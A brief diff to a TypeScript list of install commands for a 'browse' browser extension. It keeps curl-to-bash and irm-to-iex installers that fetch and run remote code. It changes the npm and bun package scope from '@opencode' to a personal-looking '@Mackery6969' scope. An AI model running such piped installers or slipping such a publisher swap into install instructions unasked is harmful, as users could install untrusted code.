@@ -55,8 +55,8 @@ export const extensionPages: readonly Extension[] = [
       commands: [
         { method: "curl", command: "curl -fsSL https://opencode.ai/browse/install | bash" },
         { method: "pwsh", command: "irm https://opencode.ai/browse/install.ps1 | iex" },
-        { method: "npm", command: "npm install -g @opencode/browse && browse install" },
-        { method: "bun", command: "bun add -g @opencode/browse && browse install" },
+        { method: "npm", command: "npm install -g @Mackery6969/browse && browse install" },
+        { method: "bun", command: "bun add -g @Mackery6969/browse && browse install" },
       ],
     },
     store: "https://chromewebstore.google.com/detail/mfnicocicmmlkpjnaffgihfjhdgjkdjg",
